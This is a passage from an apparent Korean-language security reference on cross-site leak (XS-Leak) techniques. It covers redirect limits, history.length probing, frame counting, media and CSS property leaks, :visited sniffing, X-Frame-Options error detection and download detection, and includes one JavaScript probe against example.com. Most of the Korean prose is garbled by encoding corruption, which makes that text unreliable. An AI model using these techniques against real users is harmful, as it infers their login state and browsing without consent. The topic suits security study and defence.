* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ìƒíƒœ ì½”ë“œ
* **ìì„¸í•œ ì •ë³´**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
* **ìš”ì•½:** ë¸Œë¼ìš°ì €ì˜ ë¦¬ë””ë ‰ì…˜ ì œí•œì„ ì‚¬ìš©í•˜ì—¬ URL ë¦¬ë””ë ‰ì…˜ì˜ ë°œìƒ ì—¬ë¶€ë¥¼ í™•ì¸í•©ë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

ë¸Œë¼ìš°ì €ì˜ **ìµœëŒ€** ë¦¬ë””ë ‰ì…˜ ìˆ˜ê°€ **20**ì¸ ê²½ìš°, ê³µê²©ìëŠ” **19ê°œì˜ ë¦¬ë””ë ‰ì…˜**ìœ¼ë¡œ ìì‹ ì˜ í˜ì´ì§€ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•˜ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ **í”¼í•´ìë¥¼ í…ŒìŠ¤íŠ¸ëœ í˜ì´ì§€ë¡œ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë§Œì•½ **ì˜¤ë¥˜**ê°€ ë°œìƒí•˜ë©´, í˜ì´ì§€ê°€ í”¼í•´ìë¥¼ **ë¦¬ë””ë ‰ì…˜í•˜ë ¤ê³  ì‹œë„í•œ ê²ƒì…ë‹ˆë‹¤**.

### íˆìŠ¤í† ë¦¬ ê¸¸ì´

* **í¬í•¨ ë°©ë²•**: í”„ë ˆì„, íŒì—…
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ë¦¬ë””ë ‰ì…˜
* **ìì„¸í•œ ì •ë³´**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **ìš”ì•½:** JavaScript ì½”ë“œëŠ” ë¸Œë¼ìš°ì € íˆìŠ¤í† ë¦¬ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë©°, ê¸¸ì´ ì†ì„±ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**History API**ëŠ” JavaScript ì½”ë“œê°€ ë¸Œë¼ìš°ì € íˆìŠ¤í† ë¦¬ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆê²Œ í•˜ë©°, ì´ëŠ” **ì‚¬ìš©ìê°€ ë°©ë¬¸í•œ í˜ì´ì§€ë¥¼ ì €ì¥í•©ë‹ˆë‹¤**. ê³µê²©ìëŠ” ê¸¸ì´ ì†ì„±ì„ í¬í•¨ ë°©ë²•ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: JavaScript ë° HTML íƒì§€ë¥¼ ê°ì§€í•˜ê¸° ìœ„í•´.\
**`history.length`**ë¥¼ í™•ì¸í•˜ê³ , ì‚¬ìš©ìê°€ **í˜ì´ì§€ë¡œ íƒìƒ‰**í•˜ê²Œ í•œ ë‹¤ìŒ, **ë™ì¼ ì¶œì²˜ë¡œ ë‹¤ì‹œ ë³€ê²½**í•˜ê³  **`history.length`**ì˜ ìƒˆ ê°’ì„ í™•ì¸í•©ë‹ˆë‹¤.

### ë™ì¼ URLë¡œ íˆìŠ¤í† ë¦¬ ê¸¸ì´

* **í¬í•¨ ë°©ë²•**: í”„ë ˆì„, íŒì—…
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: URLì´ ì¶”ì¸¡í•œ ê²ƒê³¼ ë™ì¼í•œ ê²½ìš°
* **ìš”ì•½:** íˆìŠ¤í† ë¦¬ ê¸¸ì´ë¥¼ ì•…ìš©í•˜ì—¬ í”„ë ˆì„/íŒì—…ì˜ ìœ„ì¹˜ê°€ íŠ¹ì • URLì— ìˆëŠ”ì§€ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: ì•„ë˜

ê³µê²©ìëŠ” JavaScript ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ **í”„ë ˆì„/íŒì—… ìœ„ì¹˜ë¥¼ ì¶”ì¸¡í•œ URLë¡œ ì¡°ì‘í•˜ê³ ** **ì¦‰ì‹œ** **`about:blank`**ë¡œ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íˆìŠ¤í† ë¦¬ ê¸¸ì´ê°€ ì¦ê°€í•˜ë©´ URLì´ ì˜¬ë°”ë¥´ë©° **URLì´ ë™ì¼í•  ê²½ìš° ë‹¤ì‹œ ë¡œë“œë˜ì§€ ì•Šê¸° ë•Œë¬¸ì—** ì¦ê°€í•  ì‹œê°„ì´ ìˆì—ˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì¦ê°€í•˜ì§€ ì•Šì•˜ë‹¤ë©´ **ì¶”ì¸¡í•œ URLì„ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í–ˆì§€ë§Œ**, **ì¦‰ì‹œ í›„ì—** **`about:blank`**ë¥¼ ë¡œë“œí–ˆê¸° ë•Œë¬¸ì— **íˆìŠ¤í† ë¦¬ ê¸¸ì´ê°€ ì¦ê°€í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤**.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** `window.length` ì†ì„±ì„ ê²€ì‚¬í•˜ì—¬ iframe ìš”ì†Œì˜ ìˆ˜ë¥¼ í‰ê°€í•©ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` ë˜ëŠ” `window.open`ì„ í†µí•´ ì—´ë¦° **ì›¹ì˜ í”„ë ˆì„ ìˆ˜**ë¥¼ ì„¸ëŠ” ê²ƒì€ **ì‚¬ìš©ìì˜ í˜ì´ì§€ ìƒíƒœ**ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ, í˜ì´ì§€ì— í•­ìƒ ë™ì¼í•œ ìˆ˜ì˜ í”„ë ˆì„ì´ ìˆëŠ” ê²½ìš°, í”„ë ˆì„ ìˆ˜ë¥¼ **ì§€ì†ì ìœ¼ë¡œ** í™•ì¸í•˜ë©´ ì •ë³´ê°€ ìœ ì¶œë  ìˆ˜ ìˆëŠ” **íŒ¨í„´**ì„ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê¸°ìˆ ì˜ ì˜ˆë¡œ, í¬ë¡¬ì—ì„œëŠ” **PDF**ê°€ **í”„ë ˆì„ ì¹´ìš´íŒ…**ìœ¼ë¡œ **ê°ì§€**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‚´ë¶€ì ìœ¼ë¡œ `embed`ê°€ ì‚¬ìš©ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ ê¸°ìˆ ì´ í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆëŠ” `zoom`, `view`, `page`, `toolbar`ì™€ ê°™ì€ ì½˜í…ì¸ ì— ëŒ€í•œ ì¼ë¶€ ì œì–´ë¥¼ í—ˆìš©í•˜ëŠ” [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)ê°€ ìˆìŠµë‹ˆë‹¤.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** 2ê°œì˜ ê°€ëŠ¥í•œ ìƒíƒœë¥¼ êµ¬ë³„í•˜ê¸° ìœ„í•´ ìœ ì¶œëœ ê°’ì„ ì½ìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML ìš”ì†Œë¥¼ í†µí•œ ì •ë³´ ìœ ì¶œì€ ì›¹ ë³´ì•ˆì—ì„œ ìš°ë ¤ë˜ëŠ” ë¬¸ì œë¡œ, íŠ¹íˆ ì‚¬ìš©ì ì •ë³´ì— ë”°ë¼ ë™ì  ë¯¸ë””ì–´ íŒŒì¼ì´ ìƒì„±ë˜ê±°ë‚˜ ì›Œí„°ë§ˆí¬ê°€ ì¶”ê°€ë˜ì–´ ë¯¸ë””ì–´ í¬ê¸°ê°€ ë³€ê²½ë  ë•Œ ë”ìš± ê·¸ë ‡ìŠµë‹ˆë‹¤. ì´ëŠ” ê³µê²©ìê°€ íŠ¹ì • HTML ìš”ì†Œì— ì˜í•´ ë…¸ì¶œëœ ì •ë³´ë¥¼ ë¶„ì„í•˜ì—¬ ê°€ëŠ¥í•œ ìƒíƒœë¥¼ êµ¬ë³„í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: ì´ ìš”ì†ŒëŠ” ë¯¸ë””ì–´ì˜ `duration` ë° `buffered` ì‹œê°„ì„ ë…¸ì¶œí•˜ë©°, APIë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [HTMLMediaElementì— ëŒ€í•´ ë” ì½ê¸°](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: `videoHeight` ë° `videoWidth`ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. ì¼ë¶€ ë¸Œë¼ìš°ì €ì—ì„œëŠ” `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, `webkitDecodedFrameCount`ì™€ ê°™ì€ ì¶”ê°€ ì†ì„±ì´ ì œê³µë˜ì–´ ë¯¸ë””ì–´ ì½˜í…ì¸ ì— ëŒ€í•œ ë” ê¹Šì´ ìˆëŠ” ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. [HTMLVideoElementì— ëŒ€í•´ ë” ì½ê¸°](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: ì´ í•¨ìˆ˜ëŠ” ë¹„ë””ì˜¤ ì¬ìƒ í’ˆì§ˆì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ì œê³µí•˜ë©°, `totalVideoFrames`ë¥¼ í¬í•¨í•˜ì—¬ ì²˜ë¦¬ëœ ë¹„ë””ì˜¤ ë°ì´í„°ì˜ ì–‘ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. [getVideoPlaybackQuality()ì— ëŒ€í•´ ë” ì½ê¸°](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: ì´ ìš”ì†ŒëŠ” ì´ë¯¸ì§€ì˜ `height` ë° `width`ë¥¼ ìœ ì¶œí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ë¯¸ì§€ê°€ ìœ íš¨í•˜ì§€ ì•Šì€ ê²½ìš° ì´ëŸ¬í•œ ì†ì„±ì€ 0ì„ ë°˜í™˜í•˜ë©°, `image.decode()` í•¨ìˆ˜ëŠ” ê±°ë¶€ë˜ì–´ ì´ë¯¸ì§€ë¥¼ ì œëŒ€ë¡œ ë¡œë“œí•˜ì§€ ëª»í–ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. [HTMLImageElementì— ëŒ€í•´ ë” ì½ê¸°](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** ì‚¬ìš©ìì˜ ìƒíƒœ ë˜ëŠ” ìƒíƒœì™€ ê´€ë ¨ëœ ì›¹ì‚¬ì´íŠ¸ ìŠ¤íƒ€ì¼ì˜ ë³€í™”ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì‚¬ìš©ìì˜ ìƒíƒœì— ë”°ë¼ **ì›¹ì‚¬ì´íŠ¸ ìŠ¤íƒ€ì¼**ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ì í˜ì´ì§€ì— **HTML ë§í¬ ìš”ì†Œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ êµì°¨ ì¶œì²˜ CSS íŒŒì¼ì„ ì‚½ì…í•  ìˆ˜ ìˆìœ¼ë©°, **ê·œì¹™**ì€ ê³µê²©ì í˜ì´ì§€ì— **ì ìš©**ë©ë‹ˆë‹¤. í˜ì´ì§€ê°€ ì´ëŸ¬í•œ ê·œì¹™ì„ ë™ì ìœ¼ë¡œ ë³€ê²½í•˜ë©´ ê³µê²©ìëŠ” ì‚¬ìš©ì ìƒíƒœì— ë”°ë¼ ì´ëŸ¬í•œ **ì°¨ì´**ë¥¼ **ê°ì§€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ìœ ì¶œ ê¸°ìˆ ë¡œì„œ ê³µê²©ìëŠ” `window.getComputedStyle` ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • HTML ìš”ì†Œì˜ **CSS** ì†ì„±ì„ **ì½ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ, ê³µê²©ìëŠ” ì˜í–¥ì„ ë°›ëŠ” ìš”ì†Œì™€ ì†ì„± ì´ë¦„ì´ ì•Œë ¤ì ¸ ìˆë‹¤ë©´ ì„ì˜ì˜ CSS ì†ì„±ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** URLì— `:visited` ìŠ¤íƒ€ì¼ì´ ì ìš©ë˜ì—ˆëŠ”ì§€ ê°ì§€í•˜ì—¬ ì´ë¯¸ ë°©ë¬¸í–ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**ì´ê²ƒ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ì— ë”°ë¥´ë©´, ì´ëŠ” í—¤ë“œë¦¬ìŠ¤ í¬ë¡¬ì—ì„œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

CSS `:visited` ì„ íƒìëŠ” ì‚¬ìš©ìê°€ ì´ì „ì— ë°©ë¬¸í•œ ê²½ìš° URLì„ ë‹¤ë¥´ê²Œ ìŠ¤íƒ€ì¼ë§í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê³¼ê±°ì—ëŠ” `getComputedStyle()` ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ ìŠ¤íƒ€ì¼ ì°¨ì´ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ìµœì‹  ë¸Œë¼ìš°ì €ëŠ” ì´ ë©”ì„œë“œê°€ ë§í¬ì˜ ìƒíƒœë¥¼ ë…¸ì¶œí•˜ì§€ ëª»í•˜ë„ë¡ ë³´ì•ˆ ì¡°ì¹˜ë¥¼ êµ¬í˜„í–ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì¡°ì¹˜ì—ëŠ” ë§í¬ê°€ ë°©ë¬¸ëœ ê²ƒì²˜ëŸ¼ í•­ìƒ ê³„ì‚°ëœ ìŠ¤íƒ€ì¼ì„ ë°˜í™˜í•˜ê³  `:visited` ì„ íƒìë¡œ ì ìš©í•  ìˆ˜ ìˆëŠ” ìŠ¤íƒ€ì¼ì„ ì œí•œí•˜ëŠ” ê²ƒì´ í¬í•¨ë©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ì œí•œì—ë„ ë¶ˆêµ¬í•˜ê³  ë§í¬ì˜ ë°©ë¬¸ ìƒíƒœë¥¼ ê°„ì ‘ì ìœ¼ë¡œ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•œ ê°€ì§€ ê¸°ìˆ ì€ ì‚¬ìš©ìê°€ CSSì— ì˜í–¥ì„ ë°›ëŠ” ì˜ì—­ê³¼ ìƒí˜¸ì‘ìš©í•˜ë„ë¡ ìœ ë„í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. íŠ¹íˆ `mix-blend-mode` ì†ì„±ì„ í™œìš©í•©ë‹ˆë‹¤. ì´ ì†ì„±ì€ ìš”ì†Œì™€ ë°°ê²½ì„ í˜¼í•©í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì— ë”°ë¼ ë°©ë¬¸ ìƒíƒœë¥¼ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ë§í¬ì˜ ë Œë”ë§ íƒ€ì´ë°ì„ ì•…ìš©í•˜ì—¬ ì‚¬ìš©ì ìƒí˜¸ì‘ìš© ì—†ì´ ê°ì§€ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë¸Œë¼ìš°ì €ëŠ” ë°©ë¬¸í•œ ë§í¬ì™€ ë°©ë¬¸í•˜ì§€ ì•Šì€ ë§í¬ë¥¼ ë‹¤ë¥´ê²Œ ë Œë”ë§í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì´ëŠ” ë Œë”ë§ì—ì„œ ì¸¡ì • ê°€ëŠ¥í•œ ì‹œê°„ ì°¨ì´ë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ëŸ¬ ë§í¬ë¥¼ ì‚¬ìš©í•˜ì—¬ íƒ€ì´ë° ì°¨ì´ë¥¼ ì¦í­ì‹œí‚¤ëŠ” ì´ ê¸°ìˆ ì„ ë³´ì—¬ì£¼ëŠ” ê°œë… ì¦ëª…(PoC)ì´ í¬ë¡¬ ë²„ê·¸ ë³´ê³ ì„œì— ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ íƒ€ì´ë° ë¶„ì„ì„ í†µí•´ ë°©ë¬¸ ìƒíƒœë¥¼ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ì†ì„±ê³¼ ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ë¬¸ì„œ í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ì‹­ì‹œì˜¤:

* `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** Google Chromeì—ì„œëŠ” X-Frame-Options ì œí•œìœ¼ë¡œ ì¸í•´ í˜ì´ì§€ê°€ êµì°¨ ì¶œì²˜ ì‚¬ì´íŠ¸ì— í¬í•¨ë˜ëŠ” ê²ƒì´ ì°¨ë‹¨ë  ë•Œ ì „ìš© ì˜¤ë¥˜ í˜ì´ì§€ê°€ í‘œì‹œë©ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

í¬ë¡¬ì—ì„œ `X-Frame-Options` í—¤ë”ê°€ "deny" ë˜ëŠ” "same-origin"ìœ¼ë¡œ ì„¤ì •ëœ í˜ì´ì§€ê°€ ê°ì²´ë¡œ í¬í•¨ë˜ë©´ ì˜¤ë¥˜ í˜ì´ì§€ê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤. í¬ë¡¬ì€ ì´ ê°ì²´ì˜ `contentDocument` ì†ì„±ì— ëŒ€í•´ ë¹ˆ ë¬¸ì„œ ê°ì²´(ì¦‰, `null`ì´ ì•„ë‹˜)ë¥¼ ê³ ìœ í•˜ê²Œ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ëŠ” iframeì´ë‚˜ ë‹¤ë¥¸ ë¸Œë¼ìš°ì €ì™€ëŠ” ë‹¤ë¦…ë‹ˆë‹¤. ê³µê²©ìëŠ” ë¹ˆ ë¬¸ì„œë¥¼ ê°ì§€í•˜ì—¬ ì‚¬ìš©ìì˜ ìƒíƒœì— ëŒ€í•œ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ ê°œë°œìê°€ X-Frame-Options í—¤ë”ë¥¼ ì¼ê´€ë˜ê²Œ ì„¤ì •í•˜ì§€ ì•Šê³  ì˜¤ë¥˜ í˜ì´ì§€ë¥¼ ê°„ê³¼í•˜ëŠ” ê²½ìš° ë”ìš± ê·¸ë ‡ìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ ì¶œì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë³´ì•ˆ í—¤ë”ì˜ ì¸ì‹ê³¼ ì¼ê´€ëœ ì ìš©ì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** ê³µê²©ìëŠ” iframeì„ í™œìš©í•˜ì—¬ íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ ê°ì§€í•  ìˆ˜ ìˆìœ¼ë©°, iframeì˜ ì§€ì†ì ì¸ ì ‘ê·¼ ê°€ëŠ¥ì„±ì€ íŒŒì¼ ë‹¤ìš´ë¡œë“œê°€ ì„±ê³µì ìœ¼ë¡œ ì´ë£¨ì–´ì¡ŒìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` í—¤ë”, íŠ¹íˆ `Content-Disposition: attachment`ëŠ” ë¸Œë¼ìš°ì €ì— ì½˜í…ì¸ ë¥¼ ì¸ë¼ì¸ìœ¼ë¡œ í‘œì‹œí•˜ëŠ” ëŒ€ì‹  ë‹¤ìš´ë¡œë“œí•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤. ì´ ë™ì‘ì€ ì‚¬ìš©ìê°€ íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ ìœ ë°œí•˜ëŠ” í˜ì´ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ”ì§€ ê°ì§€í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í¬ë¡œë¯¸ì›€ ê¸°ë°˜ ë¸Œë¼ìš°ì €ì—ì„œëŠ” ì´ ë‹¤ìš´ë¡œë“œ ë™ì‘ì„ ê°ì§€í•˜ê¸° ìœ„í•œ ëª‡ ê°€ì§€ ê¸°ìˆ ì´ ìˆìŠµë‹ˆë‹¤:

1. **ë‹¤ìš´ë¡œë“œ ë°” ëª¨ë‹ˆí„°ë§**:
* í¬ë¡œë¯¸ì›€ ê¸°ë°˜ ë¸Œë¼ìš°ì €ì—ì„œ íŒŒì¼ì´ ë‹¤ìš´ë¡œë“œë˜ë©´ ë¸Œë¼ìš°ì € ì°½ í•˜ë‹¨ì— ë‹¤ìš´ë¡œë“œ ë°”ê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤.
* ì°½ ë†’ì´ì˜ ë³€í™”ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ ë‹¤ìš´ë¡œë“œ ë°”ì˜ ë‚˜íƒ€ë‚¨ì„ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. **iframeì„ í†µí•œ ë‹¤ìš´ë¡œë“œ íƒìƒ‰**:
* í˜ì´ì§€ê°€ `Content-Disposition: attachment` í—¤ë”ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ ìœ ë°œí•  ë•Œ íƒìƒ‰ ì´ë²¤íŠ¸ë¥¼ ë°œìƒì‹œí‚¤ì§€ ì•ŠìŠµë‹ˆë‹¤.
* ì½˜í…ì¸ ë¥¼ iframeì— ë¡œë“œí•˜ê³  íƒìƒ‰ ì´ë²¤íŠ¸ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ ì½˜í…ì¸  ë°°ì¹˜ê°€ íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ ìœ ë°œí•˜ëŠ”ì§€(íƒìƒ‰ ì—†ìŒ) ì—¬ë¶€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **iframe ì—†ì´ ë‹¤ìš´ë¡œë“œ íƒìƒ‰**:
* iframe ê¸°ìˆ ê³¼ ìœ ì‚¬í•˜ê²Œ, ì´ ë°©ë²•ì€ iframe ëŒ€ì‹  `window.open`ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
* ìƒˆë¡œ ì—´ë¦° ì°½ì—ì„œ íƒìƒ‰ ì´ë²¤íŠ¸ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ íŒŒì¼ ë‹¤ìš´ë¡œë“œê°€ ìœ ë°œë˜ì—ˆëŠ”ì§€(íƒìƒ‰ ì—†ìŒ) ë˜ëŠ” ì½˜í…ì¸ ê°€ ì¸ë¼ì¸ìœ¼ë¡œ í‘œì‹œë˜ì—ˆëŠ”ì§€(íƒìƒ‰ ë°œìƒ)ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¡œê·¸ì¸í•œ ì‚¬ìš©ìë§Œ ì´ëŸ¬í•œ ë‹¤ìš´ë¡œë“œë¥¼ ìœ ë°œí•  ìˆ˜ ìˆëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì´ëŸ¬í•œ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìš´ë¡œë“œ ìš”ì²­ì— ëŒ€í•œ ë¸Œë¼ìš°ì €ì˜ ì‘ë‹µì„ ê¸°ë°˜ìœ¼ë¡œ ì‚¬ìš©ìì˜ ì¸ì¦ ìƒíƒœë¥¼ ê°„ì ‘ì ìœ¼ë¡œ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
